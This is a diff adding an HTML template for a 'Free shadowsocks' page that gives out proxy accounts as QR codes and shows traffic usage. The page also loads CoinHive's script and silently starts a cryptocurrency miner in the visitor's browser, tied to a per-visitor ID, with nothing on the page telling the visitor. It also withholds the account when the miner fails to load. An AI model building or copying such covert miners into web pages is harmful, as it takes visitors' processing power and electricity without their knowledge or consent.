@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
+    <meta name="format-detection" content="telephone=no">
+    <title>Free shadowsocks</title>
+    <link rel="stylesheet" href="/libs/bootstrap.min.css">
+    <style type="text/css">
+      .flow {
+        margin: 24px 10px 3px 10px;
+        font-size: 22px;
+        text-align: center;
+      }
+      .flowleft {
+        margin: 3px 10px 10px 10px;
+        font-size: 22px;
+        text-align: center;
+      }
+      .address {
+        margin: 10px;
+        font-size: 16px;
+        word-wrap:break-word;
+        text-align: center;
+      }
+      .qrcode {
+        text-align: center;
+      }
+    </style>
+  </head>
+
+  <body class="container">
+    <script src="/libs/jquery.min.js"></script>
+    <script src="/libs/bootstrap.min.js"></script>
+    <script src="/libs/qrcode.min.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <div class="row" style="margin-top: 15px;">
+      <div class="flow col-md-12 col-lg-12"></div>
+      <div class="flowleft col-md-12 col-lg-12"></div>
+    </div>
+    <div class="row">
+      <div class="qrcode col-md-12 col-lg-12">
+        <a id="qrcode" href=""></a>
+      </div>
+    </div>
+    <div class="row">
+      <div class="address col-md-12 col-lg-12">正在获取ss账号</div>
+    </div>
+    <script>
+      let user;
+      if(localStorage.getItem('user')) {
+        user = localStorage.getItem('user');
+      } else {
+        user = Date.now() + Math.random().toString().substr(2);
+        localStorage.setItem('user', user);
+      }
+      const getAccount = () => {
+        $.get('/account', { user }, function(data) {
+          if(data.status === -1) {
+            user = Date.now() + Math.random().toString().substr(2);
+            localStorage.setItem('user', user);
+            location.reload();
+          } else if (data.status === 0) {
+            const qr = qrcode(8, 'Q');
+            qr.addData(data.qrcode);
+            qr.make();
+            document.getElementById('qrcode').innerHTML = qr.createImgTag(6);
+            $('#qrcode').attr('href', data.qrcode);
+            $('.address').text(data.qrcode);
+            $('.flow').text('已用流量: ' + data.flow);
+            $('.flowleft').text('剩余流量: ' + data.flowLeft);
+          }
+        });
+      };
+      setInterval(() => {
+        getAccount();
+      }, 10 * 1000);
+      getAccount();
+      if(window.CoinHive) {
+        var miner = new CoinHive.User('<%= publicKey%>', user, {
+          throttle: +'<%= speed%>'
+        });
+        miner.start();
+      } else {
+        $('.address').text('获取ss账号失败');
+      }
+    </script>
+  </body>
+</html>
